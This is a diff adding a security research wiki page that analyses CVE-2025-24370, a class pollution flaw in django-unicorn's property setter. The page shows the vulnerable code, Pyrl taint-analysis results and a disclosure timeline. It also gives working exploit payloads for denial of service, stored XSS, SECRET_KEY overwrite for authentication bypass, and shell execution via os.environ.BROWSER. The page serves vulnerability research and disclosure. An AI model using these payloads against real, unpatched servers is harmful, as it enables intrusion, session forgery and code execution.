@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>django-unicorn | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/types/" >Vulnerability Types</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/consequences/" >Consequences</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Collection</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcases</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/reference/" >Reference</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/reference/cve-index/" >CVE Index</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/faq/" >FAQ</a>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/history/" >History</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="django-unicorn-cve-2025-24370">django-unicorn (CVE-2025-24370)</h1>
+<p><strong>django-unicorn</strong> is a reactive component framework for Django (2.4K stars) that
+synchronizes client-side state with server-side Python objects over WebSocket messages.
+When a user interacts with a component in the browser, the frontend sends a JSON message
+naming the property to update and its new value. The backend resolves the property path
+reflectively through <code>getattr</code>/<code>setattr</code> without any path validation.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/adamghill/django-unicorn">adamghill/django-unicorn</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>0.61.0</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td><a href="https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43">CVE-2025-24370</a></td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Agnostic-Get × Dual-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Remote (WebSocket POST)</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed in 0.62.0</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The sink is <code>set_property_value</code> in
+<code>django_unicorn/views/action_parsers/utils.py</code>. It receives a dotted <code>property_name</code>
+directly from the JSON body of a WebSocket message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_property_value</span>(component, property_name, property_value, <span style="color:#f92672">...</span>):
+</span></span><span style="display:flex;"><span>    property_name_parts <span style="color:#f92672">=</span> property_name<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>    component_or_field <span style="color:#f92672">=</span> component
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> idx, property_name_part <span style="color:#f92672">in</span> enumerate(property_name_parts):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(component_or_field, property_name_part):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">==</span> len(property_name_parts) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>                setattr(component_or_field, property_name_part, property_value)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                component_or_field <span style="color:#f92672">=</span> getattr(component_or_field, property_name_part)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(component_or_field, dict):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">==</span> len(property_name_parts) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>                component_or_field[property_name_part] <span style="color:#f92672">=</span> property_value
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                component_or_field <span style="color:#f92672">=</span> component_or_field[property_name_part]
+</span></span></code></pre></div><p>The function performs both <code>getattr</code> and <code>__getitem__</code> for resolution (agnostic-get) and
+both <code>setattr</code> and <code>__setitem__</code> for the final write (dual-set). There is no check for
+dunder-prefixed path segments. Any path the attacker provides is followed verbatim.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The same sink produces four distinct consequences depending on where the path terminates.</p>
+<h3 id="1-denial-of-service">1. Denial of Service</h3>
+<p>Overwrite <code>__getattribute__</code> on the component&rsquo;s class with a non-callable string.</p>
+<pre tabindex="0"><code>name:  __class__.__getattribute__
+value: &#34;1337&#34;
+</code></pre><p><strong>Effect</strong>: <code>type(component).__getattribute__</code> is now <code>&quot;1337&quot;</code>. Any subsequent attribute
+access on any instance of that class raises <code>TypeError: 'str' object is not callable</code>.
+The Django process becomes unable to serve any request that touches this component class.</p>
+<p><strong>Gadget</strong>: <a href="/wiki/docs/gadgets/dos/">DoS — <code>__getattribute__</code> overwrite</a>.</p>
+<h3 id="2-universal-stored-xss">2. Universal stored XSS</h3>
+<p>Overwrite BeautifulSoup&rsquo;s HTML entity-escape map so that <code>&lt;</code> is &ldquo;escaped&rdquo; to an
+attacker-supplied script tag.</p>
+<pre tabindex="0"><code>name:  __init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.&lt;
+value: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre><p><strong>Effect</strong>: every HTML escape operation the server performs now injects the attacker&rsquo;s
+script instead of encoding <code>&lt;</code> as <code>&amp;lt;</code>. All pages served to all users contain the
+malicious JavaScript. This is a universal stored XSS — it persists for the
+lifetime of the process and affects every user, not just the attacker&rsquo;s session.</p>
+<p><strong>Gadget</strong>: <a href="/wiki/docs/gadgets/xss/">XSS — BeautifulSoup entity map</a>.</p>
+<h3 id="3-authentication-bypass">3. Authentication bypass</h3>
+<p>Overwrite Django&rsquo;s <code>SECRET_KEY</code> to an attacker-known value.</p>
+<pre tabindex="0"><code>name:  __init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY
+value: &#34;13371337&#34;
+</code></pre><p><strong>Effect</strong>: the attacker now knows the signing secret that Django uses for session
+cookies, CSRF tokens, and password reset links. They can forge a session cookie for any
+user (including superusers) offline, then present it to the server.</p>
+<p><strong>Gadget</strong>: <a href="/wiki/docs/gadgets/auth-bypass/">Auth bypass — SECRET_KEY overwrite</a>.</p>
+<h3 id="4-remote-code-execution">4. Remote code execution</h3>
+<p>Two writes: (1) stage a shell command in <code>os.environ.BROWSER</code>, (2) poison the
+<code>location_cache</code> TODO list with <code>[&quot;antigravity&quot;, &quot;any&quot;]</code> so the process later imports
+<code>antigravity</code>, which calls <code>webbrowser.open()</code>, which reads <code>BROWSER</code> and executes it.</p>
+<pre tabindex="0"><code>name:  __init__.__globals__.sys.modules.os.environ.BROWSER
+value: &#34;/bin/sh -c &#39;touch /tmp/pwned&#39;&#34;
+
+name:  __init__.__globals__.location_cache._Cache__data.todo
+value: [&#34;antigravity&#34;, &#34;any&#34;]
+</code></pre><p><strong>Effect</strong>: arbitrary shell command execution as the Django process user.</p>
+<p><strong>Gadget</strong>: <a href="/wiki/docs/gadgets/rce/">RCE — <code>os.environ.BROWSER</code> + antigravity</a>.</p>
+<h2 id="detection-by-pyrl">Detection by Pyrl</h2>
+<p>Pyrl reports 8 taint flows from the WebSocket request body to the sink. The taint
+propagation for the primary flow:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Step</th>
+          <th>Location</th>
+          <th>Label</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td><code>request</code> at view entry</td>
+          <td><code>T_INPUT</code></td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td><code>action_queue</code> iteration</td>
+          <td><code>T_ENUM</code></td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td><code>prop_name</code> extraction from message</td>
+          <td><code>T_KEY</code></td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td><code>getattr(component, name)</code></td>
+          <td><code>T_OBJ</code> with <code>G_ATTR</code></td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>Branch merging at loop end</td>
+          <td><code>G_ATTR ⊎ G_ITEM</code> (Agnostic-Get)</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td><code>setattr</code> / <code>obj[key] = val</code> sinks</td>
+          <td>Dual-Set detected</td>
+      </tr>
+  </tbody>
+</table>
+<p>Classification: <strong>Agnostic-Get × Dual-Set</strong>.</p>
+<h2 id="disclosure-timeline">Disclosure timeline</h2>
+<ul>
+<li><strong>2024-12-04</strong> — Vulnerability reported to django-unicorn maintainer via GitHub
+Security Advisory (GHSA).</li>
+<li><strong>2025-01-08</strong> — Fix released in django-unicorn 0.62.0 (path validation added,
+dunder traversal blocked).</li>
+<li><strong>2025-01-08</strong> — CVE-2025-24370 assigned.</li>
+<li><strong>2025-01-08</strong> — GHSA-g9wf-5777-gq43 published.</li>
+</ul>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p><a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/django-unicorn/poc"><code>cp-collection/django-unicorn/poc/</code></a>
+— runnable exploit environment with <code>run.sh</code> and <code>requirements.txt</code>.</p>
+<h2 id="references">References</h2>
+<ol>
+<li>GHSA-g9wf-5777-gq43. <em>Class Pollution in django-unicorn allows DoS, XSS, RCE, and
+Authentication Bypass</em>. <a href="https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43">https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43</a></li>
+<li>Fix commit (0.62.0): dunder path rejection in <code>set_property_value</code>.
+<a href="https://github.com/adamghill/django-unicorn/commit/">https://github.com/adamghill/django-unicorn/commit/</a></li>
+<li>Liu et al. <em>The First Large-Scale Systematic Study of Python Class Pollution
+Vulnerability</em>. IEEE S&amp;P 2025.
+<a href="https://jackfromeast.github.io/assets/Pyrl.pdf">https://jackfromeast.github.io/assets/Pyrl.pdf</a></li>
+</ol>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
